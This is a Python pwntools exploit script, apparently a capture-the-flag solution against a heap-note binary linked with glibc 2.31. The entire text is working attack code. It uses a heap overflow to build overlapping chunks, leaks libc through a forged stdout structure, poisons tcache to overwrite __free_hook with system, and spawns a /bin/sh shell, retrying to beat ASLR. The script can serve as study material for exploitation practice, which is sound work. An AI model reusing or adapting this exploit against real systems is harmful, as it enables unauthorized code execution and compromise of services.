from elftools.construct import lib
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]
# context.timeout = 1

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "./libc-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

def get_io():
    if not f_remote:
        io = process([vuln_path])
        # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
    else:
        io = remote("", 9999)
    return io

def ddebug(io, b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add(io, idx, size):
    io.sendlineafter(">> ", b"1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))

def edit(io,idx, new_size, content):
    io.sendlineafter(">> ", b"3")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("of content: ", new_size)
    io.sendafter("to say: ", content)

def delete(io, idx):
    io.sendlineafter(">> ", b"2")
    io.sendlineafter("Index: ", str(idx))

def pwn():
    io = get_io()

    for i in range(8):
        add(io, i, 0xf0)

    edit(io, 0, b"%256c"+p64(0xffff), "tinyfat")

    payload = b"\x00" * 0xf0
    payload += p64(0x100*4+0x101)
    edit(io, 1, b"512", payload) 
    delete(io, 4)
    delete(io, 3)
    delete(io, 2)

    add(io, 2, 0x90)
    add(io, 3, 0x50)

    libc.address = 0
    stdout = (libc.symbols.get('_IO_2_1_stdout_',0) - 0x8) & 0x0FFF
    log.success("stdout:-----> " + hex(stdout))

    stdout += 0xb000
    edit(io, 2, b"a"*0xa0+p64(0x90), "aa")
    edit(io, 3, "100", b"b"*0x58+p16(stdout))
    add(io, 8, 0xf0)
    add(io, 9, 0xf0)
    edit(io, 9, b"128", p64(0xfbad1800) + p64(0)*3 + b"\x00")
    stdio = u64(io.recvuntil("\x7f", timeout=0.11)[-6:].ljust(8, b"\x00"))
    if stdio <= 0:
        return
    libc.address = stdio - 0x1ec980
    log.success("libc.address:-----> " + hex(libc.address))

    edit(io, 3, "100", b"b"*0x50+p64(0x101)) #还原chunk8的size,不然free失败
    delete(io, 5)
    delete(io, 8)
    _free_hook = libc.symbols.get("__free_hook", 0)
    edit(io, 3, "100", b"b"*0x58+p64(_free_hook-0x8))
    # ddebug(io, "b malloc\n b free\n")
    add(io, 10, 0xf0)
    add(io, 11, 0xf0)

    system = libc.symbols.get("system", 0)
    log.success("system:----->" + hex(system))
    edit(io, 11, "100", p64(system))
    
    ddebug(io, "breakrva 0x16c4\ncontinue")
    edit(io, 6, b"%256c"+b"/bin/sh\x00", "aa")
    delete(io, 7)

    io.interactive()

# pwn()
for i in range(30):
    try:
        log.success(f"==========={i}============")
        pwn()
        time.sleep(0.5)
    except:
        pass
